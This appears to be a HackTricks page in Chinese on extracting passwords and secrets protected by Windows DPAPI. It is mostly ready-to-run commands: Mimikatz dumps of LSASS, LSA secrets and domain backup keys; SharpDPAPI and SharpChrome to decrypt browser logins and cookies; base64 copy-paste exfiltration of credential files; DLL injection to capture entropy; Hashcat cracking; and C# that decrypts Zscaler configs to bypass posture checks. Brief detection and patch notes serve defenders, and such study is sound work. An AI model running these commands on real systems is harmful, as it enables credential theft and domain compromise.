# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## 什么是 DPAPI

Data Protection API (DPAPI) 主要用于 Windows 操作系统中对**非对称私钥进行对称加密**，并将用户或系统 secrets 作为重要的 entropy 来源。该方法通过允许开发者使用从用户登录 secrets 派生的 key，或在系统加密场景下使用从系统 domain authentication secrets 派生的 key 来加密数据，从而简化了加密过程，也免除了开发者自行管理 encryption key 保护的需求。

使用 DPAPI 最常见的方式是通过 **`CryptProtectData` 和 `CryptUnprotectData`** 函数。这些函数允许应用程序使用当前登录的 process session 安全地加密和解密数据。这意味着，只有加密数据的同一用户或系统才能将其解密。

此外，这些函数还接受一个 **`entropy` 参数**，该参数也会在加密和解密过程中使用。因此，要解密使用此参数加密的内容，必须提供加密时使用的相同 entropy 值。

### Users key generation

DPAPI 会根据每个用户的 credentials 生成一个唯一的 key（称为 **`pre-key`**）。此 key 从用户的 password 和其他因素派生，其 algorithm 取决于用户类型，但最终会生成一个 SHA1。例如，对于 domain users，**它取决于该用户的 NTLM hash**。

这一点特别值得关注，因为如果 attacker 能够获取用户的 password hash，就可以：

- 无需联系任何 API，使用该用户的 key **解密任何通过 DPAPI 加密的数据**
- 尝试 offline **crack password**，以生成有效的 DPAPI key

此外，每当用户使用 DPAPI 加密某些数据时，都会生成一个新的 **master key**。该 master key 才是实际用于加密数据的 key。每个 master key 都会分配一个用于标识它的 **GUID**（Globally Unique Identifier）。

master keys 存储在 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 目录中，其中 `{SID}` 是该用户的 Security Identifier。master key 会使用用户的 **`pre-key`** 加密，同时也会使用 **domain backup key** 加密，以便进行 recovery（因此同一个 key 会使用两种不同的 pass 加密两次）。

请注意，用于加密 master key 的 **domain key 位于 domain controllers 中且永不改变**，因此如果 attacker 能够访问 domain controller，就可以获取 domain backup key，并解密该 domain 中所有用户的 master keys。<sup>[[2]](#references)</sup>

加密 blobs 的 headers 中包含用于加密其中数据的 **master key 的 GUID**。

> [!TIP]
> DPAPI encrypted blobs 以 **`01 00 00 00`** 开头

查找 master keys：
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
以下是某个用户的一组 Master Keys 的样子：

![What is DPAPI - 用户密钥生成：以下是某个用户的一组 Master Keys 的样子](<../../images/image (1121).png>)

### Machine/System key generation

这是用于让计算机加密数据的密钥。它基于 **DPAPI_SYSTEM LSA secret**，这是一个只有 SYSTEM 用户可以访问的特殊密钥。此密钥用于加密需要由系统自身访问的数据，例如计算机级凭据或系统范围的机密信息。<sup>[[2]](#references)</sup>

请注意，这些密钥**没有域备份**，因此只能在本地访问：

- **Mimikatz** 可以使用以下命令转储 LSA secrets 来访问它：`mimikatz lsadump::secrets`
- 该 secret 存储在注册表中，因此管理员可以**修改 DACL 权限来访问它**。注册表路径为：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- 也可以从注册表配置单元中离线提取。例如，在目标系统上以管理员身份保存这些配置单元，然后将其外传：
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
然后在你的分析机上，从 hives 中恢复 DPAPI_SYSTEM LSA secret，并使用它解密 machine-scope blobs（scheduled task passwords、service credentials、Wi‑Fi profiles 等）：
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### 由 DPAPI 保护的数据

DPAPI 保护的个人数据包括：

- Windows 凭据
- Internet Explorer 和 Google Chrome 的密码及自动补全数据
- Outlook 和 Windows Mail 等应用程序的电子邮件和内部 FTP 账户密码
- 共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥
- 远程桌面连接、.NET Passport 的密码，以及用于各种加密和身份验证用途的私钥
- 由 Credential Manager 管理的网络密码，以及使用 CryptProtectData 的应用程序中的个人数据，例如 Skype、MSN messenger 等
- 注册表中的加密 blob
- ...

系统保护的数据包括：
- Wifi 密码
- 计划任务密码
- ...

### Master key 提取选项

- 如果用户拥有域管理员权限，则可以访问**域备份密钥**，以解密该域中的所有用户 Master key：
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- 具有本地管理员权限后，可以**访问 LSASS 内存**，提取所有已连接用户的 DPAPI 主密钥以及 SYSTEM 密钥。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 如果用户拥有本地管理员权限，则可以访问 **DPAPI_SYSTEM LSA secret**，以解密机器主密钥：
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 如果已知用户的密码或 NTLM hash，则可以**直接解密该用户的主密钥**：
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 如果你在以该用户身份运行的 session 中，可以通过 **RPC** 向 DC 请求用于解密主密钥的**备份密钥**。如果你是本地管理员且该用户已登录，则可以为此**窃取其 session token**：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## 列出 Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 访问 DPAPI 加密数据

### 查找 DPAPI 加密数据

常见的受保护用户文件位于：

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 也请尝试将上述路径中的 `\Roaming\` 更改为 `\Local\`。

枚举示例：
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) 可以在文件系统、注册表和 B64 blobs 中查找 DPAPI 加密的 blobs：
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
注意，[**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)（来自同一 repo）可用于使用 DPAPI 解密 cookies 等敏感数据。

#### Chromium/Edge/Electron 快速配方（SharpChrome）

- 当前用户，以交互方式解密已保存的登录信息/cookies（即使使用 Chrome 127+ app-bound cookies 也可用，因为在用户上下文中运行时，会从用户的 Credential Manager 解析额外密钥）：
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- 仅有文件时进行离线分析。首先从 profile 的 "Local State" 中提取 AES state key，然后使用它解密 cookie DB：
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- 当你拥有 DPAPI domain backup key (PVK) 以及目标主机上的 admin 权限时，执行域范围/远程 triage：
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- 如果你拥有用户的 DPAPI prekey/credkey（来自 LSASS），就可以跳过密码破解，直接解密配置文件数据：
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
注释
- 较新的 Chrome/Edge 构建版本可能会使用“App-Bound”加密来存储某些 cookies。没有额外的 app-bound key，无法对这些特定 cookies 进行离线解密；请在目标用户上下文中运行 SharpChrome，以自动获取该密钥。请参阅下方引用的 Chrome security blog 文章。<sup>[[5]](#references)</sup>

### 访问密钥和数据

- **使用 SharpDPAPI** 从当前会话中的 DPAPI encrypted files 获取 credentials：
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **获取凭据资料**，如加密数据和 guidMasterKey。<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **访问 masterkeys**：

使用 RPC 解密请求 **domain backup key** 的用户的 masterkey：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** 工具还支持以下用于 masterkey 解密的参数（注意，可以使用 `/rpc` 获取域备份密钥，使用 `/password` 使用明文密码，或使用 `/pvk` 指定 DPAPI 域私钥文件...）：<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **使用 masterkey 解密数据**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** 工具还支持用于 `credentials|vaults|rdg|keepass|triage|blob|ps` 解密的以下参数（注意，可以使用 `/rpc` 获取域 backup key，使用 `/password` 使用明文密码，使用 `/pvk` 指定 DPAPI 域私钥文件，使用 `/unprotect` 使用当前用户会话...）：<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- 直接使用 DPAPI prekey/credkey（无需 password）

如果你可以 dump LSASS，Mimikatz 通常会暴露一个 per-logon DPAPI key，可用于解密用户的 masterkeys，而无需知道 plaintext password。将此值直接传递给 tooling：
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- 使用**当前用户会话**解密一些数据：
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### 使用 Impacket dpapi.py 进行离线解密

如果你拥有受害用户的 SID 和密码（或 NT hash），就可以完全离线地使用 Impacket 的 dpapi.py 解密 DPAPI masterkeys 和 Credential Manager blobs。<sup>[[10]](#references)[[11]](#references)</sup>

- 识别磁盘上的 artefacts：
- Credential Manager blob(s)：%APPDATA%\Microsoft\Credentials\<hex>
- 匹配的 masterkey：%APPDATA%\Microsoft\Protect\<SID>\{GUID}

- 如果文件传输工具不稳定，可以在主机上对文件进行 base64 编码，然后复制输出内容：
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- 使用用户的 SID 和 password/hash 解密 masterkey：
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 使用已解密的 masterkey 解密 credential blob：
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
此工作流经常可以恢复由使用 Windows Credential Manager 的应用保存的域凭据，其中包括管理帐户（例如 `*_adm`）。

---

### 处理可选熵（“Third-party entropy”）

某些应用会向 `CryptProtectData` 传递额外的 **entropy** 值。如果没有此值，即使已知正确的 masterkey，也无法解密该 blob。因此，在针对以这种方式保护的凭据时，获取 entropy 至关重要（例如 Microsoft Outlook、某些 VPN 客户端）。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)（2022）是一个 user-mode DLL，可 hook 目标进程内部的 DPAPI 函数，并透明地记录所提供的任何可选 entropy。以 **DLL-injection** 模式针对 `outlook.exe` 或 `vpnclient.exe` 等进程运行 EntropyCapture 后，将输出一个文件，将每个 entropy buffer 映射到调用进程和 blob。之后可以将捕获的 entropy 提供给 **SharpDPAPI**（`/entropy:`）或 **Mimikatz**（`/entropy:<file>`），以解密数据。<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### 离线破解 masterkey（Hashcat & DPAPISnoop）

Microsoft 从 Windows 10 v1607（2016）开始引入了 **context 3** masterkey 格式。`hashcat` v6.2.6（2023 年 12 月）新增了 hash-modes **22100**（DPAPI masterkey v1 context ）、**22101**（context 1）和 **22102**（context 3），支持直接从 masterkey 文件中对用户密码进行 GPU 加速破解。因此，攻击者无需与目标系统交互，即可执行 word-list 或 brute-force 攻击。<sup>[[7]](#references)</sup>

`DPAPISnoop`（2024）可自动化执行此过程：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
该工具还可以解析 Credential 和 Vault blobs，使用已破解的密钥对其进行解密，并导出明文密码。<sup>[[8]](#references)</sup>


### 访问其他计算机数据

在 **SharpDPAPI 和 SharpChrome** 中，可以指定 **`/server:HOST`** 选项来访问远程计算机的数据。当然，你需要能够访问该计算机，并且以下示例假设已知 **domain backup encryption key**：
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 其他工具

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个能够自动从 LDAP directory 中提取所有 users 和 computers，并通过 RPC 提取 domain controller backup key 的工具。随后，该 script 会解析所有 computers 的 IP address，并对所有 computers 执行 smbclient，以获取所有 users 的 DPAPI blobs，然后使用 domain backup key 解密全部内容。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

通过从 LDAP 提取的 computers list，即使事先不知道，也可以找到每个 sub network！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) 可以自动 dump 由 DPAPI 保护的 secrets。2.x release 引入了：<sup>[[9]](#references)</sup>

* 从数百台 hosts 并行收集 blobs
* 解析 **context 3** masterkeys，并自动集成 Hashcat cracking
* 支持 Chrome “App-Bound” encrypted cookies（见下一节）
* 新增 **`--snapshot`** mode，可反复 poll endpoints，并 diff 新创建的 blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) 是一个用于解析 masterkey/credential/vault files 的 C# parser，可以输出 Hashcat/JtR formats，并可选择自动调用 cracking。它完全支持 Windows 11 24H1 及之前版本的 machine 和 user masterkey formats。<sup>[[8]](#references)</sup>


## 常见检测项

- 访问 `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 以及其他 DPAPI-related directories 中的 files。
- 尤其是通过 **C$** 或 **ADMIN$** 等 network share 进行访问。
- 使用 **Mimikatz**、**SharpDPAPI** 或类似 tooling 访问 LSASS memory 或 dump masterkeys。
- Event **4662**：*An operation was performed on an object* —— 可与访问 **`BCKUPKEY`** object 相关联。
- 当某个 process 请求 *SeTrustedCredManAccessPrivilege*（Credential Manager）时触发 Event **4673/4674**。

---
### 2023-2025 vulnerabilities & ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023 年 11 月）。拥有 network access 的 attacker 可以诱骗 domain member 获取恶意 DPAPI backup key，从而解密 user masterkeys。该问题已在 2023 年 11 月的 cumulative update 中修复 —— administrators 应确保 DCs 和 workstations 均已完整打补丁。<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption**（2024 年 7 月）使用额外存储在 user 的 **Credential Manager** 中的 key，取代了 legacy DPAPI-only protection。现在，离线解密 cookies 需要同时具备 DPAPI masterkey 和 **GCM-wrapped app-bound key**。SharpChrome v2.3 和 DonPAPI 2.x 在 user context 下运行时能够恢复该额外 key。<sup>[[5]](#references)</sup>


### 案例研究：Zscaler Client Connector —— 从 SID 派生的 Custom Entropy

Zscaler Client Connector 将多个 configuration files 存储在 `C:\ProgramData\Zscaler` 下（例如 `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）。每个 file 都使用 **DPAPI (Machine scope)** 加密，但 vendor 提供的 **custom entropy** 是在 *runtime* 计算得到的，而不是存储在 disk 上。<sup>[[1]](#references)</sup>

该 entropy 由两个 elements 重建：

1. 嵌入在 `ZSACredentialProvider.dll` 中的 hard-coded secret。
2. configuration 所属 Windows account 的 **SID**。

该 DLL 实现的 algorithm 等价于：
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
由于该 secret 嵌入在可从磁盘读取的 DLL 中，**任何拥有 SYSTEM 权限的本地攻击者都可以为任意 SID 重新生成 entropy，并离线解密这些 blobs**：
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
解密后会得到完整的 JSON 配置，其中包括每个 **device posture check** 及其预期值——这些信息对于尝试客户端绕过非常有价值。

> TIP：其他加密 artefacts（`*.mtt`、`*.mtp`、`*.mtc`、`*.ztc`）使用 DPAPI 保护，但不包含 entropy（`16` 个零字节）。因此，在获得 SYSTEM 权限后，可以直接使用 `ProtectedData.Unprotect` 对其进行解密。

## References

- [1] [Synacktiv – 你应该相信你的 zero trust 吗？绕过 Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets。DPAPI 中的安全分析与数据恢复](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [使用 Mimikatz 和 C++ 读取 DPAPI 加密的 Secrets](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI（数据保护应用程序接口）Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [提升 Chrome cookies 在 Windows 上的安全性](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture：简单提取 DPAPI Optional Entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy：AD ACL abuse、KeePassXC Argon2 cracking，以及通过 DPAPI decryption 获得 DC admin 权限](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
